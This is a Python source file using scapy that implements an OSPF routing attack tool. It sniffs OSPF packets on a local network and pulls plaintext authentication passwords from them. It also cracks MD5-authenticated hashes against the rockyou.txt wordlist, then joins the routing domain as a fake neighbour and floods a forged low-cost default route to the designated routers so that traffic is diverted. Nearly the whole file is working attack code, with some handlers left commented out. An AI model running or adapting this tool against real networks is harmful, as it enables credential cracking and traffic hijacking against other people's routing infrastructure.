#!/usr/bin/python3

import hashlib
from requests.compat import bytes
import typing
import logging
import threading
import time
from dataclasses import dataclass, field
from enum import Enum, IntEnum, auto
from typing import Any

from scapy.all import Packet, get_if_hwaddr, get_if_addr, sendp, sniff
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP
from scapy.contrib.ospf import (
        OSPF_Hdr,
        OSPF_Hello,
        OSPF_DBDesc,
        OSPF_LSUpd,
        OSPF_External_LSA,
        )

LOG = logging.getLogger("ospf-session")

ALL_SPF_ROUTERS = "224.0.0.5"
ALL_SPF_ROUTERS_MAC = "01:00:5e:00:00:05"
ALL_DR_ROUTERS = "224.0.0.6"
ALL_DR_ROUTERS_MAC = "01:00:5e:00:00:06"

ROCKYOU = "/usr/share/wordlist/rockyou.txt"

class OSPFAuthType(IntEnum):
    NONE = 0
    PLAINTEXT = 1
    CRYPTO = 2

class NeighbourState(Enum):
    DOWN = auto()
    INIT = auto()
    TWO_WAY = auto()
    EXSTART = auto()
    EXCHANGE = auto()
    LOADING = auto()
    FULL = auto()


class OSPFType(IntEnum):
    # OSPF Hello
    HELLO = 1
    # OSPF Database Description
    DBD = 2
    # OSPF Link State Request
    LSR = 3
    # OSPF Link State Update
    LSU = 4
    # OSPF Link State Acknowledge
    LSACK = 5


class DBDFlags(IntEnum):
    NONE = 0x00
    INIT = 0x04
    MORE = 0x02 
    MASTER = 0x01


@dataclass
class OSPFConfig:
    iface: str
    area: str
    int_ip: str
    router_id: str
    
    # Auth details TODO: determine if should use hex/bytes/int
    authtype: int
    plaintext_pw: str | None
    key_id: int
    authdata_len: int
    seq: int

    mask: str = "255.255.255.0"
    hello_interval: int = 10
    dead_interval: int = 40
    priority: int = 0 #NOTE: Priority 0 = DROTHER - not participating in DR/BDR election
    options: int = 0x02
    mtu: int = 1500
    rxmt_interval: int = 5 # retransmission interval
    max_retries: int = 3


@dataclass
class Neighbour:
    # To populate
    router_id: str # nb router id
    ip: str # nb ip
    mac: str | None = None # nb mac

    state: NeighbourState = NeighbourState.DOWN

    is_master: bool | None = None
    dd_seq: int | None = None

    pending_requests: list[tuple[int, str, str]] = field(default_factory=list)
    pending_acks: dict[tuple[int, str, str], dict[str, Any]] = field(default_factory=dict)

    neighbour_headers: list[Any] = field(default_factory=list)

    last_seen: float = field(default_factory=time.time)

    def is_dead(self, now: float, dead_interval: int) -> bool:
        return now - self.last_seen > dead_interval

    def set_state(self, new_state: NeighbourState) -> None:
        if self.state != new_state:
            LOG.info(
                "Neighbor %s: %s -> %s",
                self.router_id,
                self.state.name,
                new_state.name,
            )
            self.state = new_state

# Main Class
class OSPFSession:
    def __init__(self, config: OSPFConfig) -> None:
        self.config = config

        # Device IP and MAC
        self.src_ip = get_if_addr(config.iface)
        self.src_mac = get_if_hwaddr(config.iface)

        # Track DR/BDR - both starts with "0.0.0.0"
        self.dr = "0.0.0.0"
        self.bdr = "0.0.0.0"

        self.neighbours:dict[str, Neighbour] = {}
        
        # Key: {lsa_type, link_state_id, advertising_router}
        self.lsdb: dict[tuple[int, str, str], Any] = {}

        self.running = False
        self.lock = threading.Lock()

    def run(self):
        self.running = True

        LOG.info(
"""
[*] Starting OSPF session [*]
Interface = %s
Src IP = %s
Router ID = %s
area = %s
""",
self.config.iface,
self.src_ip,
self.config.router_id,
self.config.area,
                )

        # Heartbeat
        self.start_hello_loop()
        # self.start_retransmission_loop()

        try:
            self.start_sniffer()
        finally:
            self.running = False

    ### ------ OSPF HELLO ------ ###
    def start_hello_loop(self) -> threading.Thread:
        """Starts threads for heartbeat/polling"""
        thread = threading.Thread(target=self._hello_loop, daemon=True)
        thread.start()
        return thread

    def _hello_loop(self) -> None:
        """Keeps device visible to OSPF"""
        while self.running:
            now = time.time()

            with self.lock:
                self.expire_dead_neighbours(now)
                neighbour_ids = self.get_active_neighbour_ids(now)

            hello = self.build_hello_packet(neighbour_ids)

            self._send_ospf(
                    dst_ip=ALL_SPF_ROUTERS,
                    dst_mac=ALL_SPF_ROUTERS_MAC,
                    ospf_type=OSPFType.HELLO,
                    payload=hello,
                    )

            time.sleep(self.config.hello_interval)

    def expire_dead_neighbours(self, now: float) -> None:
        """Checks if neighbour links are dead, then removes them from neighbours list"""
        dead = [
            rid
            for rid, nb in self.neighbours.items()
            if nb.is_dead(now, self.config.dead_interval)
        ]

        for rid in dead:
            LOG.warning("Neighbor %s expired", rid)
            del self.neighbours[rid]
            
    def get_active_neighbour_ids(self, now: float) -> list[str]:
        """Retrieves active neighbours links"""
        return [
            nb.router_id
            for nb in self.neighbours.values()
            if not nb.is_dead(now, self.config.dead_interval)
        ]

    def build_hello_packet(self, neighbour_ids: list[str]) -> Packet:
        """OSPF Hello Packet Builder, returns scapy packet"""
        return OSPF_Hello(
            mask=self.config.mask,
            hellointerval=self.config.hello_interval,
            options=self.config.options,
            prio=self.config.priority,
            deadinterval=self.config.dead_interval,
            router=self.dr,
            backup=self.bdr,
            neighbors=neighbour_ids,
        )
    ### ------ OSPF HELLO ENDS ------ ###

    ### ----- Retransmission Loop ------ ###
    # def start_retransmission_loop(self) -> threading.Thread:
    #     thread = threading.Thread(target=self._retransmission_loop, daemon=True)
    #     thread.start()
    #     return thread
    #
    # def _retransmission_loop(self) -> None:
    #     while self.running:
    #         now = time.time()
    #
    #         with self.lock:
    #             for nb in self.neighbours.values():
    #                 for key, entry in list(nb.pending_acks.items()):
    #                     # Skip if retransmission interval not reached
    #                     if now - entry["sent_at"] < self.config.rxmt_interval:
    #                         continue
    #
    #                     if entry["retries"] >= self.config.max_retries:
    #                         LOG.warning("Max retransmission retires reached for %s, stopping retransmission...", nb.router_id)
    #                         del nb.pending_acks[key]
    #                         continue
    #
    #                     LOG.debug("Retransmitting %s to %s...", key, nb.router_id)
    #                     self.send_lsupd(nb, [entry["lsa"]], track_ack=False)
    #                     entry["sent_at"] = now
    #                     entry["retries"] += 1
    #         time.sleep(1)

    ### ------ OSPF SNIFFER ------ ###
    def start_sniffer(self) -> None:
        sniff(
            iface=self.config.iface,
            filter="ip proto 89",
            prn=self.handle_packets,
            store=False,
            stop_filter=lambda _: not self.running,
        )
    ### ------ OSPF SNIFFER END ------ ###

    ### ------ OSPF PACKET HANDLERS ------ ###
    def handle_packets(self, pkt: Any) -> None:
        if IP not in pkt or OSPF_Hdr not in pkt:
            return

        ospf = pkt[OSPF_Hdr]

        # Own OSPF Packet - Drop
        if ospf.src == self.config.router_id:
            return

        # Different OSPF Area - Drop
        if ospf.area != self.config.area:
            return

        self.config.authtype = getattr(ospf, "authtype", 0)
        # Impt: Extract password/authdata
        if self.config.authtype == OSPFAuthType.PLAINTEXT:
            # Extract plaintext pw directly
            self.config.plaintext_pw = ospf.authdata
        elif self.config.authtype == OSPFAuthType.CRYPTO:
            # Step 1. Extract keyID, authdatalen, and seq numbers
            # Step 2. Extract actual authdata (last 16 bytes of entire packet)
            # Step 3. Run cracker function to extract password (to lock or to not lock, that is the question)
            # Step 4. Fill self.config.plaintext_pw with cracked value 
            # Step 5. update _send_ospf func with corresponding details
            self.config.key_id = getattr(ospf, "keyid", 1)
            self.config.authdata_len = getattr(ospf, "authdatalen", 0)

            if not hasattr(ospf, "seq"):
                self.config.seq = int(time.time()) & 0xFFFFFFFF
            else:
                self.config.seq = (getattr(ospf, "seq", 0) + 1) & 0xFFFFFFFF

            # Crypto Authdata PW is the last 16 bytes of the packet
            # Convert raw packet to bytes and retrieve last 16 bytes to extract hashed pw
            # TODO: Run hash cracker func
            self.config.plaintext_pw = self.crack_password(ospf, ROCKYOU)

            if not self.config.plaintext_pw:
                return

        # Otherwise Determine OSPF Packet Type
        with self.lock:
            nb = self.get_or_create_neighbour(pkt)

        # Handlers for sniffed/incoming packets, OUTSIDE of lock to prevent deadlocks
        if ospf.type == OSPFType.HELLO:
            self.handle_hello(nb, ospf)
        elif ospf.type == OSPFType.DBD:
            self.handle_dbd(nb, ospf)
        # elif ospf.type == OSPFType.LSR:
        #     self.handle_lsreq(nb, ospf)
        # elif ospf.type == OSPFType.LSU:
        #     self.handle_lsupd(nb, ospf)
        # elif ospf.type == OSPFType.LSACK:
        #     self.handle_lsack(nb, ospf)

    def get_or_create_neighbour(self, pkt: Any) -> Neighbour:
        """Get Neighbour List and Adds Neighbour to List if not already added"""
        ospf = pkt[OSPF_Hdr]
        router_id = str(ospf.src)
        ip = pkt[IP].src

        # TODO: check correct type usage
        nb = self.neighbours.get(router_id)

        if nb is None:
            # Create neighbour packet
            nb = Neighbour(
                    router_id=router_id,
                    ip=ip,
                    )
            self.neighbours[router_id] = nb
            LOG.info("[+] New Neighbour Detected: %s at %s", router_id, ip)

        nb.last_seen = time.time()

        if Ether in pkt:
            nb.mac = pkt[Ether].src

        return nb

    def handle_hello(self, nb: Neighbour, ospf: Any) -> None:
        """OSPF HELLO Packet Handler"""
        ospf_hello = ospf[OSPF_Hello]

        # Update OSPF Hello state from DOWN to INIT
        if nb.state == NeighbourState.DOWN:
            nb.set_state(NeighbourState.INIT)

        # Update tracking field
        neighbour_list = [str(x) for x in ospf_hello.neighbors]
        self.dr = ospf_hello.router
        self.bdr = ospf_hello.backup

        # Check if my Router ID in Neighbour's OSPF Hello list
        if self.config.router_id in neighbour_list:
            if nb.state in {NeighbourState.DOWN, NeighbourState.INIT}:
                nb.set_state(NeighbourState.TWO_WAY)

        # Form adjacency if 
        if nb.state == NeighbourState.TWO_WAY and self.should_form_adjacency(nb, ospf_hello):
            self.start_exstart(nb)

    def should_form_adjacency(self, nb: Neighbour, ospf_hello: OSPF_Hello) -> bool:
        """Form adjacency only if neighbour is DR/BDR since we are not partaking in DR/BDR election"""
        # Checks if OSPF_Hello router and backup fields matches neighbours ip addr
        nb_is_dr = str(ospf_hello.router) == nb.ip
        nb_is_bdr = str(ospf_hello.backup) == nb.ip
        # Initialising - No DR set yet
        no_dr_declared = str(ospf_hello.router) == "0.0.0.0"

        return nb_is_dr or nb_is_bdr or no_dr_declared

    ### ------ DBD NEGOTIATION ------ ###
    def start_exstart(self, nb: Neighbour) -> None:
        """Begins DBD Negotiation - Decide DBD master slave"""
        if nb.mac is None:
            LOG.warning("[!] Cannot start ExStart with %s: no MAC address.", nb.router_id)
            return

        nb.set_state(NeighbourState.EXSTART)
        nb.is_master = None
        # Match 32-bit OSPF Seq numbers
        nb.dd_seq = int(time.time()) & 0xFFFFFFFF

        dbd_packet = self.build_dbd_packet(
                master=True,
                init=True,
                more=True,
                dd_seq=nb.dd_seq,
                lsa_headers=[],
                )

        self._send_ospf(
                dst_ip=nb.ip,
                dst_mac=nb.mac,
                ospf_type=OSPFType.DBD,
                payload=dbd_packet,
                )

    def build_dbd_packet(
            self,
            master: bool,
            init: bool,
            more: bool,
            dd_seq: int,
            lsa_headers: list[Any]
            ) -> Packet:
        """DBD Packet Builder"""
        # Using raw integer bitmask instead of list of flags
        flag_value = 0

        if init:
            flag_value |= DBDFlags.INIT
        if more:
            flag_value |= DBDFlags.MORE
        if master:
            flag_value |= DBDFlags.MASTER

        return OSPF_DBDesc(
                mtu=self.config.mtu,
                options=self.config.options,
                dbdescr=flag_value,
                ddseq=dd_seq,
                lsaheaders=lsa_headers,
                )
    
    def handle_dbd(self, nb: Neighbour, ospf: Any) -> None:
        """Handler for received OSPF DBD Type Packet"""
        dbd_packet = ospf[OSPF_DBDesc]
        # Retrieve integer bitmask and cast to DBDFlags Enum
        flags = DBDFlags(dbd_packet.dbdescr)

        # Ensure neighbour state not DOWN, INIT or TWO_WAY
        if nb.state in {NeighbourState.DOWN, NeighbourState.INIT, NeighbourState.TWO_WAY}:
            return

        # Establish master/slave relationship (router with highest id)
        if nb.state == NeighbourState.EXSTART:
            self.handle_exstart_dbd(nb, dbd_packet, flags)
            return

        # Exchange headers/summaries of Link State Database
        if nb.state == NeighbourState.EXCHANGE:
            self.handle_exchange_dbd(nb, dbd_packet, flags)

        # Get full details of missing/outdated routes
        # if nb.state == NeighbourState.LOADING:
        #     self.handle_loading_dbd(nb, dbd_packet, flags)

    def handle_exstart_dbd(self, nb: Neighbour, dbd_packet: OSPF_DBDesc, flags: DBDFlags) -> None:
        """Handler to establish master/slave relationship"""
        # Safe evaluation for empty lsaheaders returns True if empty, False otherwise
        has_no_lsas = getattr(dbd_packet, "lsaheaders", None) in (None, [])

        # Neighbour proposes itself as master
        expected_exstart = DBDFlags.INIT | DBDFlags.MORE | DBDFlags.MASTER
        nb_proposes_master = (flags & expected_exstart) == expected_exstart and has_no_lsas # Simple bitwise AND and ensure that DBDesc packets has no actual routing data

        if nb_proposes_master and nb.is_master is None:
            # Neighbour has larger router id - wins master role
            if nb.router_id > self.config.router_id:
                nb.is_master = True 
                nb.dd_seq = dbd_packet.ddseq

                # Master here refers to if master flag should be set for packet to be sent out confusing ahh
                reply_packet = self.build_dbd_packet(
                        master=False,
                        init=False,
                        more=True,
                        dd_seq=typing.cast(int, nb.dd_seq),
                        lsa_headers=[],
                        )

                self._send_ospf(
                        dst_ip=nb.ip,
                        dst_mac=typing.cast(str, nb.mac), 
                        ospf_type=OSPFType.DBD,
                        payload=reply_packet,
                        )
                nb.set_state(NeighbourState.EXCHANGE)

            # Otherwise drop packet
            return

        # Neighbour accepts us as master - confirm ddseq number same as our tracked dd_seq number
        nb_yeilded = not (flags & DBDFlags.MASTER) and dbd_packet.ddseq == nb.dd_seq

        if nb_yeilded:
            nb.is_master = False 

            # Safely parse headers
            lsa_headers = getattr(dbd_packet, "lsaheaders", []) or []
            self.collect_lsa_headers(nb, lsa_headers)
            nb.set_state(NeighbourState.EXCHANGE)

            self.continue_dbd_exchange(nb, more=bool(flags & DBDFlags.MORE))
    
    def handle_exchange_dbd(self, nb: Neighbour, dbd_packet: OSPF_DBDesc, flags: DBDFlags) -> None:
        """Handler for OSPF DBD EXCHANGE STATE packet exchange"""
        self.collect_lsa_headers(nb, dbd_packet.lsaheaders)

        if nb.is_master is True:
            # Update neighbour tracker to received seq num
            nb.dd_seq = dbd_packet.ddseq

            reply = self.build_dbd_packet(
                    master=False,
                    init=False,
                    more=bool(flags & DBDFlags.MORE),
                    dd_seq=typing.cast(int, nb.dd_seq),
                    lsa_headers=[],
                    )

            self._send_ospf(
                    dst_ip=nb.ip,
                    dst_mac=typing.cast(str, nb.mac),
                    ospf_type=OSPFType.DBD,
                    payload=reply,
                    )
            
            # More data waiting to be sent?
            if not bool(flags & DBDFlags.MORE):
                self.exchange_complete(nb)

        elif nb.is_master is False:
            if dbd_packet.ddseq != nb.dd_seq:
                LOG.warning("[!] Sequence mismatch in handle_exchange_dbd, slave does not match us: expected %d, got %d", nb.dd_seq, dbd_packet.ddseq)
                return

            self.continue_dbd_exchange(nb, more=bool(flags & DBDFlags.MORE))

    # NOTE: SHOULD NOT BE NEEDED as we dont plan on being master but here for good measure
    def continue_dbd_exchange(self, nb: Neighbour, more: bool) -> None:
        """Master only func: Increments dd sequence"""
        if more:
            # Increment on 32-bit seq number
            nb.dd_seq = (typing.cast(int, nb.dd_seq) + 1) & 0xFFFFFFFF

            dbd_packet = self.build_dbd_packet(
                    master=True,
                    init=False,
                    more=False,
                    dd_seq=nb.dd_seq,
                    lsa_headers=[],
                    )
            self._send_ospf(nb.ip, typing.cast(str, nb.mac), OSPFType.DBD, dbd_packet)
        else:
            self.exchange_complete(nb)

    def collect_lsa_headers(self, nb: Neighbour, lsaheaders: list[Any]) -> None:
        """Collects DBD LSA Headers and append to Unknown LSA's to Neighbour's `neighbour_headers` list"""
        for header in lsaheaders:
            key = (header.type, str(header.id), str(header.adrouter))

            if key in self.lsdb:
                continue

            already_known = any(
                    (hdr.type, str(hdr.id), str(hdr.adrouter)) == key
                    for hdr in nb.neighbour_headers
                    )

            if not already_known:
                nb.neighbour_headers.append(header)
    ### ------ END DBD NEGOIATION ------ ###

    ### ------ REQUEST MISSING LSAs ------ ###
    def exchange_complete(self, nb: Neighbour) -> None:
        """Requests missing LSAs, after DBD exchange is done"""
        if nb.neighbour_headers:
            # nb.set_state(NeighbourState.LOADING)
            # nb.neighbour_headers.clear()
            LOG.info("Skipping topology syncing...")
            nb.neighbour_headers.clear()

        nb.set_state(NeighbourState.FULL)
        LOG.info("Neighbour %s state set to FULL. Beginning route injection...", nb.router_id)

        self.inject_low_cost_route()

    def inject_low_cost_route(self) -> None:
        """Construct and floods fake default route"""
        # Craft LSA to replicate `default-information originate always metric-type 1 metric 1` router command
        fake_route = OSPF_External_LSA(
                type=5,
                id="0.0.0.0", # Default route
                mask="0.0.0.0",
                adrouter=self.config.router_id,
                options=0x00,
                metric=1,
                )

        # Bundle LSA in LSU payload
        lsu_payload = OSPF_LSUpd(
                lsacount=1,
                lsalist=[fake_route],
                )

        # Since we are DROTHER, send payload to ALLDROUTERS multicast
        # dr will intercept and validate against our FULL adjacency
        self._send_ospf(
                dst_ip=ALL_DR_ROUTERS,
                dst_mac=ALL_DR_ROUTERS_MAC,
                ospf_type=OSPFType.LSU,
                payload=lsu_payload,
                )

        LOG.info("Injected Type 1 default route via %s", ALL_DR_ROUTERS)

    # NOTE: NO NEED TO SUPPORT LSReq, LSRep, LSAck etc
    # def send_next_lsreq_batch(self, nb:Neighbour) -> None:
    #     # No LSA to send - Proceed to FULL state
    #     if not nb.neighbour_headers:
    #         nb.set_state(NeighbourState.FULL)
    #         LOG.info("Reached FULL state with neighbour %s", nb.router_id)
    #         return
    #
    #     lsreq_items = []
    #
    #     for hdr in nb.neighbour_headers:
    #         lsreq = OSPF_LSReq_Item(
    #                 type=hdr.type,
    #                 id=hdr.id,
    #                 adrouter=hdr.adrouter,
    #                 )
    #         
    #         lsreq_items.append(lsreq)
    #
    #     nb.pending_requests = []
    #
    #     for hdr in nb.neighbour_headers:
    #         key = (hdr.type, str(hdr.id), str(hdr.adrouter))
    #         nb.pending_requests.append(key)
    #
    #     # Craft LSR payload
    #     lsreq = OSPF_LSReq(requests=lsreq_items)
    #
    #     self._send_ospf(
    #             dst_ip=nb.ip,
    #             dst_mac=typing.cast(str, nb.mac),
    #             ospf_type=OSPFType.LSR,
    #             payload=lsreq
    #             )
    #
    # def handle_lsupd(self, nb:Neighbour, ospf_packet: Any) -> None:
    #     """Received full LSA and stores them"""
    #     lsupd = ospf_packet[OSPF_LSUpd]
    #     received_lsas = []
    #
    #     for lsa in lsupd.lsalist:
    #         key = self.lsa_key(lsa)
    #         current = self.lsdb.get(key)
    #
    #         if current is None or self.is_newer_lsa(lsa, current):
    #             self.lsdb[key] = lsa
    #             received_lsas.append(lsa)
    #
    #         # Repopulate neighbour_headers list without received key
    #         nb.neighbour_headers = [
    #                 hdr for hdr in nb.neighbour_headers
    #                 if (hdr.type, str(hdr.id), str(hdr.adrouter)) != key
    #                 ]
    #
    #         # Repopulate pending_requests list without received req
    #         nb.pending_requests = [
    #                 req for req in nb.pending_requests
    #                 if req != key
    #                 ]
    #     if received_lsas:
    #         self.send_lsa_ack(nb, received_lsas)
    #
    #     if nb.state == NeighbourState.LOADING and not nb.pending_requests:
    #         self.send_next_lsreq_batch(nb)
    #
    # def is_newer_lsa(self, incoming: Any, current: Any) -> bool:
    #     """Helper function to determine if incoming LSDB is newer that current"""
    #     if incoming.seq != current.seq:
    #         return incoming.seq > current.seq
    #
    #     if incoming.chksum != current.chksum:
    #         return incoming.chksum > current.chksum
    #
    #     return incoming.age < current.age
    #
    # def send_lsa_ack(self, nb: Neighbour, lsas: list[Any]) -> None:
    #     """Send LSA Ack"""
    #     headers = [
    #             OSPF_LSA_Hdr(
    #                 age=lsa.age,
    #                 options=lsa.options,
    #                 type=lsa.type,
    #                 id=lsa.id,
    #                 adrouter=lsa.adrouter,
    #                 seq=lsa.seq,
    #                 chksum=lsa.chksum,
    #                 len=lsa.len,
    #                 )
    #             for lsa in lsas
    #             ]
    #
    #     ack = OSPF_LSAck(lsaheaders=headers)
    #
    #     self._send_ospf(
    #             dst_ip=nb.ip,
    #             dst_mac=typing.cast(str, nb.mac),
    #             ospf_type=OSPFType.LSACK,
    #             payload=ack,
    #             )
    #
    # def handle_lsreq(self, nb: Neighbour, ospf: Any) -> None:
    #     """Handles neighbour's request for full LSAs"""
    #     req = ospf[OSPF_LSReq]
    #     lsas_to_send = []
    #
    #     for item in req.requests:
    #         key = self.lsa_key(item)
    #         lsa = self.lsdb.get(key)
    #
    #         if lsa is None:
    #             LOG.warning("Neighbour %s requested unknown LSA %s, skipping...", nb.router_id, key)
    #             continue
    #
    #         lsas_to_send.append(lsa)
    #
    #     if lsas_to_send:
    #         self.send_lsupd(nb, lsas_to_send, track_ack=True)
    #
    # def handle_lsack(self, nb: Neighbour, ospf: Any) -> None:
    #     """Handles Acknowledgement for LSAs sent - Remove entry from pending_ack list"""
    #     ack = ospf[OSPF_LSAck]
    #
    #     for hdr in ack.lsaheaders:
    #         key = self.lsa_key(hdr)
    #
    #         if key in nb.pending_acks:
    #             del nb.pending_acks[key]
    #             LOG.debug("Neighbour %s acknowledged LSA %s", nb.router_id, key)
    #
    # def handle_loading_dbd(self, nb: Neighbour, dbd_packet: OSPF_DBDesc, flags: DBDFlags) -> None:
    #     """Handles incoming DBD packets while waiting for requested LSAs"""
    #     self.collect_lsa_headers(nb, dbd_packet.lsaheaders)
    #
    #     if nb.neighbour_headers and not nb.pending_requests:
    #         self.send_next_lsreq_batch(nb)
    #
    # def send_lsupd(self, nb: Neighbour, lsas: list[Any], track_ack: bool):
    #     """Send full LSAs to neighbour"""
    #     if nb.mac is None:
    #         LOG.warning("Missing MAC, unable to send LSU to %s", nb.router_id)
    #         return
    #
    #     lsu_payload = OSPF_LSUpd(lsalist=lsas)
    #
    #     self._send_ospf(
    #             dst_ip=nb.ip,
    #             dst_mac=nb.mac,
    #             ospf_type=OSPFType.LSU,
    #             payload=lsu_payload,
    #             )
    #
    #     if track_ack:
    #         for lsa in lsas:
    #             key = self.lsa_key(lsa)
    #             nb.pending_acks[key] = {
    #                     "lsa": lsa,
    #                     "sent_at": time.time(),
    #                     "retries": 0,
    #                     }

    def _send_ospf(self, dst_ip: str, dst_mac: str, ospf_type: int, payload: Any) -> None:
        """Sends OSPF Packets"""
        # TODO: implement authtype checker
        if self.config.authtype == OSPFAuthType.CRYPTO:
            ospf_hdr = OSPF_Hdr(
                    version=2, # OSPF ver 2 for ipv4
                    type=ospf_type,
                    src=self.config.router_id,
                    area=self.config.area,
                    chksum=0,
                    authtype=self.config.authtype,
                    keyid=self.config.key_id,
                    authdatalen=self.config.authdata_len,
                    seq=self.config.seq,
                    )
        elif self.config.authtype == OSPFAuthType.PLAINTEXT:
            ospf_hdr = OSPF_Hdr(
                    version=2,
                    type=ospf_type,
                    src=self.config.router_id,
                    area=self.config.area,
                    authtype=self.config.authtype,
                    )
        else:
            ospf_hdr = OSPF_Hdr(
                        version=2,
                        type=ospf_type,
                        src=self.config.router_id,
                        area=self.config.area,
                        authtype=self.config.authtype,
                        ) 

        pkt = (
                Ether(src=self.src_mac, dst=dst_mac) /
                IP(src=self.src_ip, dst=dst_ip, proto=89, ttl=1) /
                ospf_hdr /
                payload
            )

        sendp(pkt, iface=self.config.iface, verbose=False)

    def crack_password(self, ospf_pkt: OSPF_Hdr, filename: str) -> str | None:
        """
        OSPF Authtype 2 - Hashed PW cracker

        Currently only supports MD5 Hash Cracking

        OSPF Uses Net-MD5, a specific MD5 hashing format

        How it works:
            1.  Enforces a strict 16 byte long Key by padding NULL bytes to the end of the key if the key length is less than 16 bytes
                Otherwise, uses the first 16 bytes of the password as the Key
            2.  Concatenates 

        """
        # Theoretically chksum should alr be 0 but just in case
        if getattr(ospf_pkt, "chksum", None) != 0:
            setattr(ospf_pkt, "chksum", 0)

        raw_ospf_pkt = bytes(ospf_pkt)

        # Extract OSPF MD5 hash located at end of OSPF packet (after OSPF header + payload)
        extracted_hash = raw_ospf_pkt[-16:]
        LOG.info("[!] Extracted hash %s", extracted_hash.hex())

        # Extract actual OSPF packet
        actual_ospf_pkt = raw_ospf_pkt[:-16]

        # Iterate and try passwords from rockyou.txt
        try:
            with open(filename, "r", encoding='utf-8') as file:
                for pw in file:
                    print(f"Trying {pw}", end="\r")
                    # Format key to exactly 16 bytes
                    pw_bytes = pw.strip().encode('utf-8')
                    padded_key = pw_bytes + b'\x00' * (16 - len(pw_bytes)) if len(pw_bytes) < 16 else pw_bytes[:16]

                    # Concatenate actual ospf pkt and padded key
                    buffer = actual_ospf_pkt + padded_key

                    # Calculate hash
                    generated_hash = hashlib.md5(buffer).digest()

                    if generated_hash == extracted_hash:
                        # Match
                        LOG.critical("[!] Found Password: %s", pw)
                        return pw 
            # Password Cracking Failed
            LOG.fatal("[!] Failed to crack password. Hash: %s", extracted_hash)
            return "" 

        except FileNotFoundError:
            LOG.error("[!] %s file not found.", filename)
        except PermissionError:
            LOG.error("[!] No permission to open %s", filename)
        except Exception as e:
            LOG.error(f"[!] crack_password - Unknown error: {e}")

    # def lsa_key(self, lsa_or_hdr: Any) -> tuple[int, str, str]:
    #     """Small Reusable lsa key helper"""
    #     return (
    #             int(lsa_or_hdr.type),
    #             str(lsa_or_hdr.id),
    #             str(lsa_or_hdr.adrouter),
    #             )
